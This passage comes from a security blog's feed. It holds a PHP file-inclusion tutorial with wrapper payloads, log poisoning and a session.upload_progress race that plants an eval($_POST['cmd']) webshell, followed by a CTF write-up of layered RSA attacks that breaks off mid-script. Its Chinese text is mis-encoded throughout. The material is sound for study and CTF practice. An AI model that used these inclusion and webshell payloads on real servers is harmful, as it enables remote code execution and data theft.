    <summary type="html">&lt;h1 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h1&gt;&lt;p&gt;å½“&lt;code&gt;unserialize()&lt;/code&gt;çš„å‚æ•°å¯æ§æ—¶, å¯ä»¥ä¼ å…¥ä¸€ä¸ªæ„é€ å¥½çš„åºåˆ—ä¸²æ§åˆ¶ç±»å†…éƒ¨çš„å˜é‡ç”šè‡³å‡½æ•°, å¦‚æœç±»å†…éƒ¨å­˜åœ¨æ¯”</summary>
      
    
    
    
    <category term="WebSummary" scheme="http://tearsjin.github.io/categories/WebSummary/"/>
    
    
    <category term="Web" scheme="http://tearsjin.github.io/tags/Web/"/>
    
    <category term="Unserialize" scheme="http://tearsjin.github.io/tags/Unserialize/"/>
    
  </entry>
  
  <entry>
    <title>The learning of php æ–‡ä»¶åŒ…å«</title>
    <link href="http://tearsjin.github.io/2021/03/21/The-learning-of-php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://tearsjin.github.io/2021/03/21/The-learning-of-php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2021-03-21T06:26:07.000Z</published>
    <updated>2021-03-23T06:27:17.699Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>æ–‡ä»¶åŒ…å«é¡¾åæ€ä¹‰, é€šè¿‡æŸäº›å‡½æ•°æ¥å¼•å…¥ä¸€äº›æ–‡ä»¶ä½†ä¼ å…¥çš„æ–‡ä»¶åæ²¡æœ‰ç»è¿‡åˆç†çš„éªŒè¯, ä»è€Œæ“ä½œäº†é¢„æƒ³ä¹‹å¤–çš„æ–‡ä»¶, å°±å¯èƒ½å¯¼è‡´æ„å¤–çš„æ–‡ä»¶æ³„æ¼ç”šè‡³æ¶æ„ä»£ç æ³¨å…¥ã€‚</p><h2 id="å¸¸è§çš„æ–‡ä»¶åŒ…å«å‡½æ•°"><a href="#å¸¸è§çš„æ–‡ä»¶åŒ…å«å‡½æ•°" class="headerlink" title="å¸¸è§çš„æ–‡ä»¶åŒ…å«å‡½æ•°"></a>å¸¸è§çš„æ–‡ä»¶åŒ…å«å‡½æ•°</h2><ol><li><p><code>include()</code></p></li><li><p><code>require()</code></p></li><li><p><code>include_once()</code></p></li><li><p><code>require_once()</code></p></li><li><p><code>highlight_file()</code></p></li><li><p><code>show_source()</code></p></li><li><p><code>readfile()</code></p></li><li><p><code>file_get_contents()</code></p></li><li><p><code>fopen()</code></p></li><li><p><code>file()</code></p></li></ol><h2 id="PHPä¼ªåè®®"><a href="#PHPä¼ªåè®®" class="headerlink" title="PHPä¼ªåè®®"></a>PHPä¼ªåè®®</h2><p>é€šå¸¸æƒ…å†µä¸‹æœ‰æ–‡ä»¶åŒ…å«å‡½æ•°è¿˜ä¸å¤Ÿ, éœ€è¦æ­é…ä¼ªåè®®æ‰èƒ½å¹²æ›´å¤šçš„äº‹æƒ…</p><table><thead><tr><th align="center">åè®®</th><th align="center">PHPç‰ˆæœ¬</th><th align="center">alow_url_fopen</th><th align="center">allow_url_include</th><th align="left">ç”¨æ³•ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="center">file://</td><td align="center">&gt;=5.2</td><td align="center">off/on</td><td align="center">off/on</td><td align="left">file://D:/soft/phpStudy/WWW/flag.txt</td></tr><tr><td align="center">php://filter</td><td align="center">&gt;=5.2</td><td align="center">off/on</td><td align="center">off/on</td><td align="left">php://filter/read=convert.base64-encode/resource=./index.php</td></tr><tr><td align="center">php://input</td><td align="center">&gt;=5.2</td><td align="center">off/on</td><td align="center"><strong>on</strong></td><td align="left">php://input  [post data]: <code>&lt;?php phpinfo() ?&gt;</code></td></tr><tr><td align="center">zip://</td><td align="center">&gt;=5.2</td><td align="center">off/on</td><td align="center">off/on</td><td align="left">zip://D:/soft/phpStudy/WWW/file.zip%23flag.txt</td></tr><tr><td align="center">compress.bzip2://</td><td align="center">&gt;=5.2</td><td align="center">off/on</td><td align="center">off/on</td><td align="left">compress.bzip2://D:/soft/phpStudy/WWW/file.bz2<br />compress.bzip2://./file.bz2</td></tr><tr><td align="center">compress.zlib://</td><td align="center">&gt;=5.2</td><td align="center">off/on</td><td align="center">off/on</td><td align="left">åŒä¸Š</td></tr><tr><td align="center">data://</td><td align="center">&gt;=5.2</td><td align="center"><strong>on</strong></td><td align="center"><strong>on</strong></td><td align="left">data://text/plain,<code>&lt;?php phpinfo()?&gt;</code><br />data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</td></tr></tbody></table><h2 id="åŒ…å«æ—¥å¿—æ–‡ä»¶"><a href="#åŒ…å«æ—¥å¿—æ–‡ä»¶" class="headerlink" title="åŒ…å«æ—¥å¿—æ–‡ä»¶"></a>åŒ…å«æ—¥å¿—æ–‡ä»¶</h2><p>WebæœåŠ¡å™¨ä¸€èˆ¬ä¼šå°†ç”¨æˆ·çš„è®¿é—®è®°å½•ä¿å­˜åœ¨æ—¥å¿—æ–‡ä»¶å½“ä¸­. å¦‚æœå­˜åœ¨æ–‡ä»¶åŒ…å«çš„å‡½æ•°, è€Œä¸”çŸ¥é“æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„, å¯ä»¥æ„é€ è¯·æ±‚æŠŠPHPä»£ç å†™è¿›æ—¥å¿—æ–‡ä»¶ä¸­å¹¶å¼•å…¥æ‰§è¡Œ</p><h3 id="å¯»æ‰¾æ—¥å¿—æ–‡ä»¶"><a href="#å¯»æ‰¾æ—¥å¿—æ–‡ä»¶" class="headerlink" title="å¯»æ‰¾æ—¥å¿—æ–‡ä»¶"></a>å¯»æ‰¾æ—¥å¿—æ–‡ä»¶</h3><p>æ—¥å¿—æ–‡ä»¶çš„ç›®å½•ä¸€èˆ¬ä¼šè¢«ä¿®æ”¹, å¯ä»¥å¯»æ‰¾<code>httpd.conf,nginx,conf</code>æˆ–è€…æ ¹æ®<code>phpinfo()</code>ä¸­çš„ä¿¡æ¯æ¥å¾—çŸ¥æ—¥å¿—æ–‡ä»¶ç›®å½•</p><p>Apache:</p><ol><li><p>Windows: <code>&lt;Apacheå®‰è£…ç›®å½•&gt;\logs\access.log | error.log</code></p></li><li><p>Linux: <code>/usr/local/apache/logs/access_log | error_log </code></p></li></ol><p>Nginx:</p><ol><li><code>/var/log/nginx</code></li></ol><h2 id="åŒ…å«session-upload-progress"><a href="#åŒ…å«session-upload-progress" class="headerlink" title="åŒ…å«session.upload_progress"></a>åŒ…å«<code>session.upload_progress</code></h2><blockquote><p>PHPç‰ˆæœ¬: 5.4+</p></blockquote><p>åœ¨php5.4ä»¥ä¸Šæ·»åŠ äº†ä¸€ä¸ªæ–°çš„åŠŸèƒ½ <code>session.upload_progress</code>, è¿™ä¸ªåŠŸèƒ½åœ¨å®¢æˆ·ç«¯ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™ä¼šåˆ›å»ºä¸€ä¸ª<code>session</code>æ–‡ä»¶, é»˜è®¤è·¯å¾„åº”è¯¥æ˜¯<code>/tmp/tmp</code>, è¿™ä¸ªæ–‡ä»¶é‡Œå­˜å‚¨çš„ä¸Šä¼ æ–‡ä»¶çš„è¿›åº¦. </p><p>ä¸è¿‡, è¦åˆ©ç”¨è¿™ä¸ª<code>session.upload_progress</code>, è¿˜è¦ä¾é å¦å¤–ä¸€ä¸ª<code>php.ini</code>çš„é»˜è®¤é€‰é¡¹<code>session.use_strict_mode = 0</code>, å½“è¿™ä¸ªå€¼ä¸º0çš„æ—¶å€™, ç”¨æˆ·æ˜¯å¯ä»¥è‡ªå·±å®šä¹‰<code>Session ID</code>çš„, æ¯”å¦‚åœ¨<code>Cookies</code>ä¸­è®¾ç½®<code>PHPSESSID =Â k1rit0</code>, <code>php</code>å°†åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ª<code>tmp/tmp/sess_k1rit0</code>, å¹¶ä¸”è‡ªåŠ¨åˆå§‹åŒ–, ä¹Ÿå°±æ˜¯ä¼šåœ¨é‡Œé¢å†™å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.prefix + session.upload_progress.name</span><br></pre></td></tr></table></figure><p><code>session.upload_progress.prefix</code>æ˜¯æœåŠ¡ç«¯è®¾ç½®çš„, é»˜è®¤ä¸º<code>upload_progress_</code><br><code>session.upload_progress.name</code>æ˜¯ç”¨æˆ·<code>POST</code>çš„<code>data</code>: <code>PHP_SESSION_UPLOAD_PROGRESS</code>, æ¯”å¦‚<code>POST</code> <code>PHP_SESSION_UPLOAD_PROGRESS= &lt;?phpÂ eval($_POST[&quot;cmd&quot;]);?&gt;</code><br>é‚£ä¹ˆç”¨æˆ·åœ¨ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™, å°±ä¼šç”Ÿæˆè¿™ä¹ˆä¸€ä¸ª<code>session</code>æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload_progress_<span class="meta">&lt;?php</span>Â <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span> | <span class="comment">// åé¢æ˜¯ä¸Šä¼ è¿›åº¦</span></span><br></pre></td></tr></table></figure><p>å¾ˆæ˜¾ç„¶è¿™ä¸ªæ–‡ä»¶å¦‚æœè¢«æ–‡ä»¶åŒ…å«å‡½æ•°åŒ…å«, åˆ™å¯ä»¥æ‰§è¡Œä¸€ç³»åˆ—çš„å‘½ä»¤<br><strong>ä½†æ˜¯è¿™ä¸ª<code>session</code>æ–‡ä»¶å°†åœ¨æ–‡ä»¶ä¸Šä¼ å®Œæˆä¹‹åè‡ªåŠ¨åˆ é™¤.<strong>è¿™é‡Œå°±éœ€è¦åˆ©ç”¨</strong>æ¡ä»¶ç«äº‰</strong>äº†, ä¸åœçš„ä¸Šä¼ åŒæ ·çš„æ–‡ä»¶, ä½¿å¾—<code>session</code>ä¸€ç›´å­˜åœ¨.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ–‡ä»¶åŒ…å«&quot;&gt;&lt;a href=&quot;#æ–‡ä»¶åŒ…å«&quot; class=&quot;headerlink&quot; title=&quot;æ–‡ä»¶åŒ…å«&quot;&gt;&lt;/a&gt;æ–‡ä»¶åŒ…å«&lt;/h1&gt;&lt;h2 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h</summary>
      
    
    
    
    <category term="WebSummary" scheme="http://tearsjin.github.io/categories/WebSummary/"/>
    
    
    <category term="Web" scheme="http://tearsjin.github.io/tags/Web/"/>
    
    <category term="æ–‡ä»¶åŒ…å«" scheme="http://tearsjin.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>writeup for 2021VNCTF Crypto</title>
    <link href="http://tearsjin.github.io/2021/03/14/writeup-for-2021VNCTF/"/>
    <id>http://tearsjin.github.io/2021/03/14/writeup-for-2021VNCTF/</id>
    <published>2021-03-14T11:51:27.000Z</published>
    <updated>2021-05-06T07:40:11.999Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™æ¬¡æ¯”èµ›å¬è¯´æ˜¯ç­¾åˆ°éš¾åº¦, å°±åšäº†ä¸€ä¸‹, ç»“æœä¹Ÿæ²¡èƒ½ak (è¯´ç®€å•éƒ½æ˜¯éª—äººçš„â€¦)<br>å—¯â€¦ ä¼šåšçš„é¢˜ä¹Ÿæ²¡ä»€ä¹ˆæ”¶è·, ç¡¬è¦è¯´çš„è¯, whitegiveçš„ç¬¬ä¸€å±‚éœ€è¦é€šè¿‡è¿ç®—æŠŠå·²çŸ¥çš„æ¡ä»¶åˆåœ¨ä¸€èµ·æˆ–è€…æ¶ˆå»ä¸€äº›ä¸å¯èƒ½æ±‚å‡ºçš„å‚æ•°, è¿™ä¸ªä¸€ç›´éƒ½æ˜¯å¯†ç åˆ†æçš„åŸºç¡€å§, æ¥çœ‹çœ‹é¢˜å§</p><h1 id="0x00-wihtegive"><a href="#0x00-wihtegive" class="headerlink" title="0x00 wihtegive"></a>0x00 wihtegive</h1><h2 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(url)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">d = getPrime(<span class="number">256</span>)</span><br><span class="line">e = inverse(d,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line">print(n)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line">m = e</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse(e,lcm(p,lcm(p-<span class="number">1</span>,q-<span class="number">1</span>)))</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">hint = <span class="built_in">pow</span>(d,e,n)</span><br><span class="line"></span><br><span class="line">print(n)</span><br><span class="line">print(c)</span><br><span class="line">print(hint)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">97814568264814384858194701955408461509880555772006698372422205341758322175891474378211599333051180365254844248340812534463000531890490435018379585036704801177155418066770861143206836558793774360498040810255823235715535487716966004194143204900564413879660115112965484824906920141847149888933004740523449213441</span></span><br><span class="line"><span class="string">86143311788363675684674113699193046781796638913243016152555572150858159500527674063754694514501999791875561142925154991000532628799185608465062814546108160434468098898040769021072007374156546314975240583347468026001633652940408779155579339470960571067652924814623371177901052302005289155305089588204204313261</span></span><br><span class="line"><span class="string">1246903000089073759886267722667196003041462505274526737638837808213476294697746018085346623497511017543801377442390781101585650581984057653018703031659844145960721073451379508212905335383758157379301019575213158532070229897587088955814288202279949391608732448294591675986989254272257059551622461096394217684402667140362275595245430242117193793913872208576714597860532581116390903216389172132085635891741189355461016795362341416848534340615825023292174042406128959</span></span><br><span class="line"><span class="string">952508462840095293368043281511747192551431448088755251878915582522463097721381421883702408853564036431155676272901680250701398946525803160765527940151587567521509500006089852079864042238196362897144754722623523621230744820970423076092319608853809407595863195726851921082224085255808985329769890887863865121647796115540376158135632760785321953364738008064130705467326745546629505023549047992509562623348749056757848144371814157305011884825502144329268299851210747</span></span><br><span class="line"><span class="string">788785744509676701442642497798353940704045062680685297430840370664093043099033424646382070232242765761123110381200239132310785932203252095093993313010883982078216697297202940152563278231011836966627537170460186597134847633828107444548759805274516431300662852153808962421740187067058018192457264083227110866080267684557127718769967184710395811547902947248700889674967381917907905535103547918375731341071557144999864774198881339085314424766509424492349867615604684</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Wow, you got here!</span></span><br><span class="line"><span class="comment"># This is the last task, trust me!</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,padding</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">7</span> </span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m+padding,e,n)</span><br><span class="line"></span><br><span class="line">print(n)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">143224951702807798608353389056046982493788310072914995404719898237226283884553121669729599925829562704800197375580487019006702401282671268969358774635337351738915083955659230582177495821699251999928502338923489031347921151957398310960671307216790020399224115377846788378990638367296298663795893865325304226511</span></span><br><span class="line"><span class="string">74797173657575640598140788410852016843612519588375968190579734420951374103129570637822547217967978911328419808529204143522454142303138959013220811558490951614314306849367068478190797885056922705403028856734095288522290055309880572321557493798362056216783777593386133347693892941928131945986087712737862263761</span></span><br><span class="line"><span class="string">9209695919437085323423940852135308337887271742988391422139555924185234849146079306139570263602339983687993333013333937719071267190971983543492940032646907167417161479697805991443259327402389097539126399994414628326218438416138199892253597375493026563369334352434282120293396846427418323600336867792587721214</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>å¥½å®¶ä¼™, è¿Cryptoéƒ½å¼€å§‹å¥—å¨ƒäº†, ä¸€å…±ä¸‰å±‚RSA, åšäº†å‰ä¸¤å±‚æ‰èƒ½çŸ¥é“ç¬¬ä¸‰å±‚</p><h2 id="ç¬¬ä¸€å±‚-åˆ©ç”¨gcd-åˆ†è§£n"><a href="#ç¬¬ä¸€å±‚-åˆ©ç”¨gcd-åˆ†è§£n" class="headerlink" title="ç¬¬ä¸€å±‚  åˆ©ç”¨gcd()åˆ†è§£n"></a>ç¬¬ä¸€å±‚  åˆ©ç”¨<code>gcd()</code>åˆ†è§£<code>n</code></h2><ul><li><code>e</code> : 65537</li><li><code>c</code>: å¯†æ–‡</li><li><code>hint</code>: $hint = d^e (mod \ n)$</li></ul><p>è¿™é¢˜ä¸ç®—éš¾, ä»”ç»†ç®—ä¸€ä¸‹å°±èƒ½çŸ¥é“è¿™ä¸ª<code>hint</code>æœ‰ä»€ä¹ˆç”¨äº†<br>é¦–å…ˆçœ‹ä¸€ä¸‹<code>d = inverse(e,lcm(p,lcm(p-1,q-1)))</code>, $p$éƒ½å·²ç»æ˜¯ç´ æ•°äº†, å…¬å€æ•°è‚¯å®šæ˜¯$kp$</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±æœ‰<br>$$<br>e \cdot d = 1 (mod \ kp)<br>$$<br>æŠŠ<code>hint</code>çš„å¼å­å’Œè¿™ä¸ªå¼å­éƒ½æ”¹å†™æˆ:<br>$$<br>e \cdot d  = 1 + k_1p \\<br>d^e = hint + k_2n<br>$$<br>è”ç«‹ä¸€ä¸‹å°±æœ‰:<br>$$<br>({k_1p+1 \over e})^e  = hint + k_2n \Rightarrow (Kp+1) = e^e(hint + k_2n) \\<br>\Rightarrow (K-e^ek_2q)p = e^e \cdot hint - 1<br>$$<br>å–ä¸ª<code>gcd(e**e * hint - 1,n)</code>, å°±å¯ä»¥æœ‰<code>p</code>äº†, åˆ†è§£<code>n</code>å°±å¥½åšäº†, è¿™ä¸€å±‚è¿˜æ˜¯æŒºæœ‰æ„æ€çš„</p><h2 id="ç¬¬äºŒå±‚-Boneh-Durfee-attack"><a href="#ç¬¬äºŒå±‚-Boneh-Durfee-attack" class="headerlink" title="ç¬¬äºŒå±‚  Boneh_Durfee attack"></a>ç¬¬äºŒå±‚  Boneh_Durfee attack</h2><p>è¿™ä¸€å±‚çš„ç§é’¥$d \approx 2^{256}$, è€Œ$n \approx 2^{1024}$, æ»¡è¶³ä½¿ç”¨Boneh_Durfee attackçš„æ¡ä»¶, ç›´æ¥æ‰”åˆ°è„šæœ¬é‡Œè·‘å°±èƒ½è·‘å‡º$d$æ¥äº†<br>æœ‰äº†$d$ç›´æ¥è§£å¯†å³å¯</p><h2 id="ç¬¬ä¸‰å±‚-Coppersmithâ€™s-Short-pad-Attack"><a href="#ç¬¬ä¸‰å±‚-Coppersmithâ€™s-Short-pad-Attack" class="headerlink" title="ç¬¬ä¸‰å±‚ Coppersmithâ€™s Short-pad Attack"></a>ç¬¬ä¸‰å±‚ Coppersmithâ€™s Short-pad Attack</h2><p>ç¬¬äºŒå±‚å‡ºæ¥ä¸€ä¸ªç½‘ç«™<code>https://dawn-whisper.lanzous.com/iCAv0lod7yj-password:gzjq&#39;</code>, ä»¥åŠå¯†ç </p><p>æ‰“å¼€åè¿˜æ˜¯ä¸€é“RSA</p><p>å¦‚é¢˜, eå¤Ÿå°, ç›´æ¥ä¸Šè„šæœ¬å°±è¡Œ</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="comment"># ç¬¬ä¸€å±‚</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">h = <span class="number">788785744509676701442642497798353940704045062680685297430840370664093043099033424646382070232242765761123110381200239132310785932203252095093993313010883982078216697297202940152563278231011836966627537170460186597134847633828107444548759805274516431300662852153808962421740187067058018192457264083227110866080267684557127718769967184710395811547902947248700889674967381917907905535103547918375731341071557144999864774198881339085314424766509424492349867615604684</span></span><br><span class="line">n = <span class="number">1246903000089073759886267722667196003041462505274526737638837808213476294697746018085346623497511017543801377442390781101585650581984057653018703031659844145960721073451379508212905335383758157379301019575213158532070229897587088955814288202279949391608732448294591675986989254272257059551622461096394217684402667140362275595245430242117193793913872208576714597860532581116390903216389172132085635891741189355461016795362341416848534340615825023292174042406128959</span></span><br><span class="line">c = <span class="number">952508462840095293368043281511747192551431448088755251878915582522463097721381421883702408853564036431155676272901680250701398946525803160765527940151587567521509500006089852079864042238196362897144754722623523621230744820970423076092319608853809407595863195726851921082224085255808985329769890887863865121647796115540376158135632760785321953364738008064130705467326745546629505023549047992509562623348749056757848144371814157305011884825502144329268299851210747</span></span><br><span class="line">ee = <span class="built_in">pow</span>(e, e)</span><br><span class="line">p = gcd(ee * h - <span class="number">1</span>, n)</span><br><span class="line">q = n // p ** <span class="number">2</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * p * (q - <span class="number">1</span>)</span><br><span class="line">d = invert(e,phi)</span><br><span class="line">e = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">print(e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¬¬äºŒå±‚</span></span><br><span class="line"><span class="comment"># Boneh_Durfee attackå‡ºçš„ç»“æœ</span></span><br><span class="line"><span class="comment"># è„šæœ¬åœ¨https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage</span></span><br><span class="line">d = <span class="number">103079922798932082066165266087442072203677117380612800709240732626110126828541</span></span><br><span class="line">n = <span class="number">97814568264814384858194701955408461509880555772006698372422205341758322175891474378211599333051180365254844248340812534463000531890490435018379585036704801177155418066770861143206836558793774360498040810255823235715535487716966004194143204900564413879660115112965484824906920141847149888933004740523449213441</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(<span class="built_in">pow</span>(<span class="number">3</span>,e,n),d,n) == <span class="number">3</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">86143311788363675684674113699193046781796638913243016152555572150858159500527674063754694514501999791875561142925154991000532628799185608465062814546108160434468098898040769021072007374156546314975240583347468026001633652940408779155579339470960571067652924814623371177901052302005289155305089588204204313261</span></span><br><span class="line">print(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¬¬ä¸‰å±‚</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span>(<span class="params">c1, c2, e, n</span>):</span></span><br><span class="line">        PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">        PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">        PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">        g1 = x^e - c1</span><br><span class="line">        g2 = (x+y)^e - c2</span><br><span class="line">        q1 = g1.change_ring(PRZZ)</span><br><span class="line">        q2 = g2.change_ring(PRZZ)</span><br><span class="line">        h = q2.resultant(q1)</span><br><span class="line">        h = h.univariate_polynomial()</span><br><span class="line">        h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">        h = h.monic()</span><br><span class="line">        kbits = n.nbits()//(<span class="number">2</span>*e*e)</span><br><span class="line">        diff = h.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> diff</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span>(<span class="params">c1, c2, diff, e, n</span>):</span></span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">g1, g2</span>):</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">n = <span class="number">143224951702807798608353389056046982493788310072914995404719898237226283884553121669729599925829562704800197375580487019006702401282671268969358774635337351738915083955659230582177495821699251999928502338923489031347921151957398310960671307216790020399224115377846788378990638367296298663795893865325304226511</span></span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">c1 = <span class="number">74797173657575640598140788410852016843612519588375968190579734420951374103129570637822547217967978911328419808529204143522454142303138959013220811558490951614314306849367068478190797885056922705403028856734095288522290055309880572321557493798362056216783777593386133347693892941928131945986087712737862263761</span></span><br><span class="line">c2 = <span class="number">9209695919437085323423940852135308337887271742988391422139555924185234849146079306139570263602339983687993333013333937719071267190971983543492940032646907167417161479697805991443259327402389097539126399994414628326218438416138199892253597375493026563369334352434282120293396846427418323600336867792587721214</span></span><br><span class="line">diff = 